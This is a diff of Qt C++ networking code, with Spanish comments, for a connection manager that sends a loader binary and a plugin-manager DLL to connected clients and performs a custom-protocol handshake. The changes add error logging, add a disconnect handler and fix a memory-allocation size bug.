@@ -18,11 +18,16 @@ void ConnectionManager::sendLoader(Connection *connection)
 
         connect(connection,SIGNAL(readyRead()),mngMessage,SLOT(readMessage()));
         connect(connection,SIGNAL(timeout()),this,SLOT(connection_timeout()));
+        connect(connection,SIGNAL(disconnected()),this,SLOT(connection_disconnected()));
         //connect(connection,SIGNAL(error(QAbstractSocket::SocketError)),this,SLOT(connectionError(QAbstractSocket::SocketError)));
 
         /* Carga desde archivo */
         QFile fileLoader("loader.bin");
-        if(!fileLoader.open(QIODevice::ReadOnly)) return;
+        if(!fileLoader.open(QIODevice::ReadOnly))
+        {
+            qCritical()<<"No encontrado loader.bin";
+            return;
+        }
         QByteArray Loader=fileLoader.readAll();
         fileLoader.close();
 
@@ -49,7 +54,11 @@ void ConnectionManager::sendPluginManager(Connection *connection)
     qDebug("Enviando pluginmanager");
 
     QFile filePluginLoader("pluginmanager.dll");
-    if(!filePluginLoader.open(QIODevice::ReadOnly)) return;
+    if(!filePluginLoader.open(QIODevice::ReadOnly))
+    {
+        qCritical()<<"No encontrado pluginmanager.dll";
+        return;
+    }
     QByteArray pluginLoader=filePluginLoader.readAll();
     filePluginLoader.close();
 
@@ -87,9 +96,7 @@ void ConnectionManager::processHandshake(Connection* connection)
     //FIXME: Definir número de puertos correcto
 #define NUM_PORTS 1
 
-    ClientHandShake=(Connection::RPEP_CLIENT_HANDSHAKE*)malloc(
-                sizeof(Connection::RPEP_CLIENT_HANDSHAKE)+sizeof(ushort)*NUM_PORTS
-                );
+    ClientHandShake=(Connection::RPEP_CLIENT_HANDSHAKE*)malloc(sizeof(Connection::RPEP_CLIENT_HANDSHAKE)+sizeof(ushort)*NUM_PORTS);
 
     ClientHandShake->CompressionALGM=connection->HandShake.SupportedCompressionAlgm[0];
     ClientHandShake->MaxBlockSize=connection->HandShake.MaxBlockSize;
@@ -98,15 +105,16 @@ void ConnectionManager::processHandshake(Connection* connection)
     ClientHandShake->Version.High=1;
     ClientHandShake->Version.Low=0;
 
-
-    Connection::RPEP_HEADER::_OperationType* Operation=(Connection::RPEP_HEADER::_OperationType*)malloc(sizeof(Connection::RPEP_HEADER::_OperationType*));
+    Connection::RPEP_HEADER::_OperationType* opType=(Connection::RPEP_HEADER::_OperationType*)malloc(sizeof(Connection::RPEP_HEADER::_OperationType));
+    opType->bOperation=true;
+    opType->Operation=Connection::RPEP_HEADER::ClientHandshake;
 
     qDebug("Enviando handshake");
 
-    connection->send(Operation,(char*)ClientHandShake,sizeof(Connection::RPEP_CLIENT_HANDSHAKE)+sizeof(ushort)*NUM_PORTS);
+    connection->send(opType,(char*)ClientHandShake,sizeof(Connection::RPEP_CLIENT_HANDSHAKE)+sizeof(ushort)*NUM_PORTS);
 
     free(ClientHandShake);
-    free(Operation);
+    free(opType);
 
      qDebug("Handshake enviado");
 
@@ -123,7 +131,7 @@ void ConnectionManager::connection_timeout()
 {
     /* TODO: eliminar de la gui tambien */
 
-    qWarning("Conection timeout");
+    qWarning()<<"Conexión ausente";
 
     Connection* connection=qobject_cast<Connection*>(sender());
     connection->deleteLater();
@@ -134,8 +142,16 @@ void ConnectionManager::connectionError(QAbstractSocket::SocketError)
     /* TODO: Hacer que si hay un error en la conexión cuando la conexión ya
              está añadida a la GUI, se elimine el item del TreeView */
 
-    qWarning("Conection error");
+
 
     Connection* connection=qobject_cast<Connection*>(sender());
     connection->deleteLater();
+}
+
+void ConnectionManager::connection_disconnected()
+{
+    qWarning("Conexión perdida");
+
+    Connection* connection=qobject_cast<Connection*>(sender());
+    if(connection) connection->deleteLater();
 }
